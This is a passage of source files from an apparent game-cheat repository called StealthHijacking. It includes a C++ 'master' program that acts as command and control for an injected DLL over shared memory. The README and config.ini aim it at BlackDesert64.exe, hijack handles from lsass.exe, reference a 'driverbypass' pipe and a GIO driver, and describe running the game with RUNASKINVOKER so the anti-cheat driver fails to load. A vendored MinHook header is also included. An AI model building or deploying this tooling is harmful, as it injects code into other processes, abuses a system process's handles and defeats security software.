    <ClCompile Include="stdafx.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
    <ClCompile Include="StealthHijackingNormalDLL.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ProjectReference Include="..\CheatHelper\CheatHelper.vcxproj">
      <Project>{a080c117-d1db-4671-8217-65496573ba4d}</Project>
    </ProjectReference>
  </ItemGroup>
  <ItemGroup>
    <None Include="Readme.md" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`StealthHijackingNormalDLL/StealthHijackingNormalDLL.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="targetver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="stdafx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="StealthHijackingNormalDLL.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="Readme.md" />
  </ItemGroup>
</Project>
```

`StealthHijackingNormalDLL/stdafx.cpp`:

```cpp
#include "stdafx.h"

```

`StealthHijackingNormalDLL/stdafx.h`:

```h
// stdafx.h : include file for standard system include files,
// or project specific include files that are used frequently, but
// are changed infrequently
//

#pragma once

#include "targetver.h"

#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
// Windows Header Files
#include <windows.h>



// reference additional headers your program requires here

```

`StealthHijackingNormalDLL/targetver.h`:

```h
#pragma once

// Including SDKDDKVer.h defines the highest available Windows platform.

// If you wish to build your application for a previous Windows platform, include WinSDKVer.h and
// set the _WIN32_WINNT macro to the platform you wish to support before including SDKDDKVer.h.

#include <SDKDDKVer.h>

```

`StealthHijackingNormalMaster/Readme.md`:

```md
# StealthHandleHijackingMaster

## Introduction


## Usage

This module is used combinaded with **StealthHandleHijackingDLL**. This is the "command and control" implementation. Has to be executed before injecting the DLL. 

HandleHijakingMaster will create a FileMapping (Share Memory) that this module uses to receive instructions and then return information to the master (where all the bot logic should be located).

## Configuration

This module requires configuration:

- The following variables in config.ini need to the provided:

[Addresses]
```
RPMAddressHigh=0x1
RPMAddressLow=0x58A60000
RPMAddress=0x0
WPMAddressHigh=0x00000000
WPMAddressLow=0x58A60000
WPMAddress=0x0
ntRVMAddressHigh=0x00000000
ntRVMAddressLow=0x58A60000
ntRVMAddress=0x0
ntWVMAddressHigh=0x00000000
ntWVMAddressLow=0x58A60000
ntWVMAddress=0x0
ZwRVMAddressHigh=0x00000000
ZwRVMAddressLow=0x58A60000
ZwRVMAddress=0x0
ZwWVMAddressHigh=0x00000000
ZwWVMAddressLow=0x58A60000
ZwWVMAddress=0x0
```

[Handles]

```
requestHandleFM=0x15FC
```

[Buffers]
```
#SIZE MUST BE SIZE+1
RPMBuffer=TTTT1
RPMBufferSize=0x6
WPMBuffer=TTTT2
WPMBufferSize=0x6
ntRVMBuffer=TTTT4
ntRVMBufferSize=0x6
ntWVMBuffer=TTTT5
ntWVMBufferSize=0x6
ZwRVMBuffer=TTTT6
ZwRVMBufferSize=0x6
ZwWVMBuffer=TTTT7
ZwWVMBufferSize=0x6
``` 

[Strings]
```
targetProc=BlackDesert64.exe
privotProc=lsass.exe
#Edit in DLL if you changed it here
fileMapName=Global\StealthHijacking
```

## Combination with other techniques

- **RUNASKINVOKER**: By executing the game using this options we will prevent the Anti-cheat to fully protect the game end load the driver.



```

`StealthHijackingNormalMaster/StealthHijackingNormalMaster.cpp`:

```cpp
// StealthHijackingNormalMaster.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include "CheatHelper.h"
#include <windows.h>

#pragma warning(disable:5040)
#define LOCK 1 


std::string fileMapName = "";
HANDLE hFileMap = NULL;
HANDLE hTargetProcess = NULL;
HANDLE hExplorerProcess = NULL;
LPVOID pFileMapMem = NULL;
SIZE_T fileMapSize = FILEMAPSIZE;


PipeMessageRequest PMRequest;
PipeMessageResponse PMResponse;

int ReadFileMapping()
{
	CopyMemory(&PMResponse, (void*)(pFileMapMem), sizeof(PipeMessageResponse));
	if (PMResponse.status == 0)
	{
		std::cout << "\t[+] Status: Successful" << std::endl;
	}
	else
	{
		std::cout << "\t[-] Status: Unsuccessful" << std::endl;
	}
	//std::cout << "\t[+] bytesRead: " << PMResponse.bytesRead << std::endl;
	//std::cout << "\t[+] buffer: ";
	//CheatHelper::PrintBytes((PVOID)PMResponse.buffer, (SIZE_T)PMResponse.bytesRead);
	return 1;
}


int WriteFileMapping()
{
	SecureZeroMemory(pFileMapMem, FILEMAPSIZE - 1);
	std::cout << "[+] Sending Msg: " << std::endl;
	std::cout << "\t[+] action: " << PMRequest.action << std::endl;
	std::cout << "\t[+] handle: 0x" << PMRequest.handle << std::endl;
	std::cout << "\t[+] address: 0x" << std::hex << PMRequest.address << std::endl;
	std::cout << "\t[+] size: " << PMRequest.size << std::endl;
	std::cout << "\t[+] buffer: ";
	CheatHelper::PrintBytes((PVOID)PMRequest.buffer, (SIZE_T)PMRequest.size);
	CopyMemory((void*)(pFileMapMem), &PMRequest, sizeof(PipeMessageRequest));
	return true;
}


bool Init()
{
	CheatHelper::loadConfig();

	//fileMapName = "Global\\StealthHijacking";
	hFileMap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE | SEC_COMMIT | SEC_NOCACHE, 0, (DWORD)fileMapSize, CheatHelper::fileMapName);
	if (!hFileMap)
	{
		std::cout << "[-] CreateFileMappingA failed: " << std::dec << GetLastError() << std::endl;
		return 1;
	}
	std::cout << "[+] CreateFileMappingA." << std::endl;
	pFileMapMem = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, fileMapSize);
	if (!pFileMapMem)
	{
		std::cout << "[-] MapViewOfFile failed: " << std::dec << GetLastError() << std::endl;
		return 1;
	}
	std::cout << "[+] MapViewOfFile." << std::endl;

	CheatHelper::checkSpinLockByte(pFileMapMem, LOCK);

	return 0;
}





int main()
{
	std::cout << "[+] Init\n";


	if (!Init())
	{

		//PMRequest.action = 1;
		//PMRequest.handle = (HANDLE)0xC32;
		//PMRequest.address = 0x0000000144BC6000;
		//strncpy_s(PMRequest.buffer, "ABCD3", BUFSIZE);
		//PMRequest.size = sizeof(PMRequest.buffer);

		PMRequest.handle = CheatHelper::requestHandleNP;
		PMRequest.address = 0x0;
		SecureZeroMemory(PMRequest.buffer, BUFSIZE-1);
		PMRequest.size = 0x0;


		int i = 1;
		while (1)
		{
			PMRequest.action = i;

			CheatHelper::prepareRequest(PMRequest);

			CheatHelper::checkSpinLockByte(pFileMapMem, LOCK);

			if (!WriteFileMapping())
			{
				std::cout << "[-] Failed writing." << std::endl;
			}


			CheatHelper::setSpinLockByte(pFileMapMem, !LOCK);
			CheatHelper::checkSpinLockByte(pFileMapMem, LOCK);

			if (!ReadFileMapping())
			{
				std::cout << "[-] Failed reading." << std::endl;
			}

			if (i == 7)
				break;
			i++;
		}
		CloseHandle(hFileMap);
		UnmapViewOfFile(pFileMapMem);
	}
	Sleep(1000000);
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

```

`StealthHijackingNormalMaster/StealthHijackingNormalMaster.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{F74258DB-52A4-4B60-8FBE-385091D35DCA}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>StealthHijackingNormalMaster</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalLibraryDirectories>C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC\14.16.27023\lib\onecore\x64</AdditionalLibraryDirectories>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="pch.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="pch.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
    <ClCompile Include="StealthHijackingNormalMaster.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ProjectReference Include="..\CheatHelper\CheatHelper.vcxproj">
      <Project>{a080c117-d1db-4671-8217-65496573ba4d}</Project>
    </ProjectReference>
  </ItemGroup>
  <ItemGroup>
    <None Include="Readme.md" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`StealthHijackingNormalMaster/StealthHijackingNormalMaster.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="pch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="pch.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="StealthHijackingNormalMaster.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="Readme.md" />
  </ItemGroup>
</Project>
```

`StealthHijackingNormalMaster/pch.cpp`:

```cpp
// pch.cpp: source file corresponding to pre-compiled header; necessary for compilation to succeed

#include "pch.h"

// In general, ignore this file, but keep it around if you are using pre-compiled headers.

```

`StealthHijackingNormalMaster/pch.h`:

```h
// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

#ifndef PCH_H
#define PCH_H

// TODO: add headers that you want to pre-compile here

#endif //PCH_H

```

`config.ini`:

```ini
[States]
bDelayExecution=0
[Addresses]
RPMAddressHigh=0x1
RPMAddressLow=0x58A60000
RPMAddress=0x0
WPMAddressHigh=0x00000000
WPMAddressLow=0x58A60000
WPMAddress=0x0
ntRVMAddressHigh=0x00000000
ntRVMAddressLow=0x58A60000
ntRVMAddress=0x0
ntWVMAddressHigh=0x00000000
ntWVMAddressLow=0x58A60000
ntWVMAddress=0x0
ZwRVMAddressHigh=0x00000000
ZwRVMAddressLow=0x58A60000
ZwRVMAddress=0x0
ZwWVMAddressHigh=0x00000000
ZwWVMAddressLow=0x58A60000
ZwWVMAddress=0x0
startAddressPhyHigh=0x00000000
startAddressPhyLow=0x58A60000
startAddressPhy=0x0
[Handles]
requestHandleNP=0x15FC
requestHandleFM=0x15FC
requestHandleDrv=0x15FC
[Buffers]
#SIZE MUST BE SIZE+1
RPMBuffer=TTTT1
RPMBufferSize=0x6
WPMBuffer=TTTT2
WPMBufferSize=0x6
ntRVMBuffer=TTTT4
ntRVMBufferSize=0x6
ntWVMBuffer=TTTT5
ntWVMBufferSize=0x6
ZwRVMBuffer=TTTT6
ZwRVMBufferSize=0x6
ZwWVMBuffer=TTTT7
ZwWVMBufferSize=0x6
[Strings]
targetProc=BD64.exe
privotProc=lsass.exe
#Edit in DLL if you changed it here
namedPipeName=\\.\\pipe\\driverbypass
#Edit in DLL if you changed it here
fileMapName=Global\StealthHijacking
driverName=\\.\GIO
```

`resources/MinHook/include/MinHook.h`:

```h
/*
 *  MinHook - The Minimalistic API Hooking Library for x64/x86
 *  Copyright (C) 2009-2017 Tsuda Kageyu.
 *  All rights reserved.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *   1. Redistributions of source code must retain the above copyright
 *      notice, this list of conditions and the following disclaimer.
 *   2. Redistributions in binary form must reproduce the above copyright
 *      notice, this list of conditions and the following disclaimer in the
 *      documentation and/or other materials provided with the distribution.
 *
 *  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 *  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 *  TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 *  PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER
 *  OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 *  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 *  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 *  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 *  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#pragma once

#if !(defined _M_IX86) && !(defined _M_X64) && !(defined __i386__) && !(defined __x86_64__)
    #error MinHook supports only x86 and x64 systems.
#endif

#include <windows.h>

// MinHook Error Codes.
typedef enum MH_STATUS
{
    // Unknown error. Should not be returned.
    MH_UNKNOWN = -1,

    // Successful.
    MH_OK = 0,

    // MinHook is already initialized.
    MH_ERROR_ALREADY_INITIALIZED,

    // MinHook is not initialized yet, or already uninitialized.
    MH_ERROR_NOT_INITIALIZED,

    // The hook for the specified target function is already created.
    MH_ERROR_ALREADY_CREATED,

    // The hook for the specified target function is not created yet.
    MH_ERROR_NOT_CREATED,

    // The hook for the specified target function is already enabled.
    MH_ERROR_ENABLED,

    // The hook for the specified target function is not enabled yet, or already
    // disabled.
    MH_ERROR_DISABLED,

    // The specified pointer is invalid. It points the address of non-allocated
    // and/or non-executable region.
    MH_ERROR_NOT_EXECUTABLE,

    // The specified target function cannot be hooked.
    MH_ERROR_UNSUPPORTED_FUNCTION,

    // Failed to allocate memory.
    MH_ERROR_MEMORY_ALLOC,

    // Failed to change the memory protection.
    MH_ERROR_MEMORY_PROTECT,

    // The specified module is not loaded.
    MH_ERROR_MODULE_NOT_FOUND,

    // The specified function is not found.
    MH_ERROR_FUNCTION_NOT_FOUND
}
MH_STATUS;

// Can be passed as a parameter to MH_EnableHook, MH_DisableHook,
// MH_QueueEnableHook or MH_QueueDisableHook.
#define MH_ALL_HOOKS NULL

#ifdef __cplusplus
extern "C" {
#endif

    // Initialize the MinHook library. You must call this function EXACTLY ONCE
    // at the beginning of your program.
    MH_STATUS WINAPI MH_Initialize(VOID);

    // Uninitialize the MinHook library. You must call this function EXACTLY
    // ONCE at the end of your program.
    MH_STATUS WINAPI MH_Uninitialize(VOID);

    // Creates a Hook for the specified target function, in disabled state.
    // Parameters:
    //   pTarget    [in]  A pointer to the target function, which will be
    //                    overridden by the detour function.
    //   pDetour    [in]  A pointer to the detour function, which will override
    //                    the target function.
    //   ppOriginal [out] A pointer to the trampoline function, which will be
    //                    used to call the original target function.
    //                    This parameter can be NULL.
    MH_STATUS WINAPI MH_CreateHook(LPVOID pTarget, LPVOID pDetour, LPVOID *ppOriginal);

    // Creates a Hook for the specified API function, in disabled state.
    // Parameters:
    //   pszModule  [in]  A pointer to the loaded module name which contains the
    //                    target function.
    //   pszTarget  [in]  A pointer to the target function name, which will be
    //                    overridden by the detour function.
    //   pDetour    [in]  A pointer to the detour function, which will override
    //                    the target function.
    //   ppOriginal [out] A pointer to the trampoline function, which will be
    //                    used to call the original target function.
    //                    This parameter can be NULL.
    MH_STATUS WINAPI MH_CreateHookApi(
        LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, LPVOID *ppOriginal);

    // Creates a Hook for the specified API function, in disabled state.
    // Parameters:
    //   pszModule  [in]  A pointer to the loaded module name which contains the
    //                    target function.
    //   pszTarget  [in]  A pointer to the target function name, which will be
    //                    overridden by the detour function.
    //   pDetour    [in]  A pointer to the detour function, which will override
    //                    the target function.
    //   ppOriginal [out] A pointer to the trampoline function, which will be
    //                    used to call the original target function.
    //                    This parameter can be NULL.
    //   ppTarget   [out] A pointer to the target function, which will be used
    //                    with other functions.
    //                    This parameter can be NULL.
    MH_STATUS WINAPI MH_CreateHookApiEx(
        LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, LPVOID *ppOriginal, LPVOID *ppTarget);

    // Removes an already created hook.
    // Parameters:
    //   pTarget [in] A pointer to the target function.
    MH_STATUS WINAPI MH_RemoveHook(LPVOID pTarget);

    // Enables an already created hook.
    // Parameters:
    //   pTarget [in] A pointer to the target function.
    //                If this parameter is MH_ALL_HOOKS, all created hooks are
    //                enabled in one go.
    MH_STATUS WINAPI MH_EnableHook(LPVOID pTarget);

    // Disables an already created hook.
    // Parameters:
    //   pTarget [in] A pointer to the target function.
    //                If this parameter is MH_ALL_HOOKS, all created hooks are
    //                disabled in one go.
    MH_STATUS WINAPI MH_DisableHook(LPVOID pTarget);

    // Queues to enable an already created hook.
    // Parameters:
    //   pTarget [in] A pointer to the target function.
    //                If this parameter is MH_ALL_HOOKS, all created hooks are
    //                queued to be enabled.
    MH_STATUS WINAPI MH_QueueEnableHook(LPVOID pTarget);

    // Queues to disable an already created hook.
    // Parameters:
    //   pTarget [in] A pointer to the target function.
    //                If this parameter is MH_ALL_HOOKS, all created hooks are
    //                queued to be disabled.
    MH_STATUS WINAPI MH_QueueDisableHook(LPVOID pTarget);

    // Applies all queued changes in one go.
    MH_STATUS WINAPI MH_ApplyQueued(VOID);

    // Translates the MH_STATUS to its name as a string.
    const char * WINAPI MH_StatusToString(MH_STATUS status);

#ifdef __cplusplus
}
#endif


```